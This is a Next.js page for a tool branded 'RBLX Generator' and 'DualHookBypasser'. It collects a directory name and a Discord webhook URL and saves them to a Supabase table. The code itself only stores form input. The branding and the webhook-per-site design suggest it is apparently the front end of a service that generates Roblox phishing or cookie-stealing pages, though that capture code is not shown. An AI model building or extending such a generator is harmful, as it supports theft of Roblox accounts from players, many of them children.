'use client';

import { useState } from 'react';
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
);

export default function Home() {
  const [directory, setDirectory] = useState('');
  const [webhook, setWebhook] = useState('');
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!directory || !webhook) {
      setMessage('⚠️ Please fill in all fields.');
      return;
    }

    setLoading(true);
    setMessage('⏳ Generating... Please wait.');

    const { data, error } = await supabase.from('websites').insert([
      {
        directory,
        webhook,
      },
    ]);

    if (error) {
      console.error(error);
      setMessage(`❌ Error: ${error.message}`);
    } else {
      setMessage('✅ Created successfully! Your entry was saved.');
      setDirectory('');
      setWebhook('');
    }

    setLoading(false);
  };

  return (
    <main className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex flex-col items-center justify-center p-6 text-white">
      <div className="w-full max-w-md bg-gray-800/70 backdrop-blur-md p-8 rounded-2xl shadow-lg border border-gray-700">
        <h1 className="text-3xl font-bold mb-6 text-center text-blue-400">
          🔮 RBLX Generator
        </h1>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block mb-2 text-gray-300 font-medium">Directory Name</label>
            <input
              type="text"
              value={directory}
              onChange={(e) => setDirectory(e.target.value)}
              placeholder="Enter directory name"
              className="w-full px-4 py-2 rounded-lg bg-gray-900 border border-gray-700 focus:ring-2 focus:ring-blue-500 outline-none text-gray-100"
            />
          </div>

          <div>
            <label className="block mb-2 text-gray-300 font-medium">Discord Webhook</label>
            <input
              type="url"
              value={webhook}
              onChange={(e) => setWebhook(e.target.value)}
              placeholder="https://discord.com/api/webhooks/..."
              className="w-full px-4 py-2 rounded-lg bg-gray-900 border border-gray-700 focus:ring-2 focus:ring-blue-500 outline-none text-gray-100"
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full py-2.5 rounded-lg bg-blue-600 hover:bg-blue-700 transition disabled:opacity-50 font-semibold"
          >
            {loading ? 'Processing...' : 'Generate'}
          </button>
        </form>

        {message && (
          <div className="mt-4 text-center text-sm bg-gray-900/60 p-3 rounded-lg border border-gray-700">
            {message}
          </div>
        )}
      </div>

      <p className="mt-8 text-sm text-gray-500">© 2025 DualHookBypasser</p>
    </main>
  );
}
